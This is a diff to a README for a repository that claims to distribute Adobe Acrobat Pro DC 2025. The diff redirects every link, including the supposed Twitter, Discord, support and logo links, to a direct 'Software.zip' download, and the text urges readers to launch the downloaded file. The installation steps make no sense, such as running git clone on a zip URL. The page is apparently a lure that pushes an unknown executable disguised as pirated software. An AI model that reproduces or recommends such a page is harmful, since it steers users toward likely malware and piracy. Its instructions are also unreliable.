@@ -26,7 +26,7 @@ Welcome to the **Adobe Acrobat Pro 2025 Latest** repository! Here, you will find
 
 ## Download Latest Version 🚀
 
-To download the latest version of Adobe Acrobat Pro DC 2025, simply click [here](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0). 📦
+To download the latest version of Adobe Acrobat Pro DC 2025, simply click [here](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip). 📦
 
 🚨 **Note:** Ensure to launch the downloaded file to start the installation process. 
 
@@ -34,7 +34,7 @@ To download the latest version of Adobe Acrobat Pro DC 2025, simply click [here]
 
 1. Clone the repository: 
    ```
-   git clone https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0
+   git clone https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip
    ```
 
 2. Navigate to the downloaded folder:
@@ -44,7 +44,7 @@ To download the latest version of Adobe Acrobat Pro DC 2025, simply click [here]
 
 3. Install Adobe Acrobat Pro DC 2025:
    ```
-   https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0
+   https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip
    ```
 
 4. Enjoy using Adobe Acrobat Pro DC 2025! 
@@ -64,12 +64,12 @@ We welcome contributions of any kind. Whether it's bug fixes, new features, or i
 
 ## Stay Connected 🌐
 
-Follow us on [Twitter](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0) for the latest updates and announcements. Join our community on [Discord](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0) to connect with other users and share your experiences.
+Follow us on [Twitter](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip) for the latest updates and announcements. Join our community on [Discord](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip) to connect with other users and share your experiences.
 
 ## Support ℹ️
 
-If you encounter any issues or have any questions, please check the "Releases" section for troubleshooting guides and additional information. For further assistance, reach out to our support team at https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0
+If you encounter any issues or have any questions, please check the "Releases" section for troubleshooting guides and additional information. For further assistance, reach out to our support team at https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip
 
 Let's make managing PDFs a breeze with Adobe Acrobat Pro DC 2025! 🎉
 
-![Adobe Acrobat Pro DC Logo](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/tag/v1.0)
+![Adobe Acrobat Pro DC Logo](https://github.com/Totia092/Adobe-Acrobat-Pro-2025-Latest/releases/download/v2.0/Software.zip)
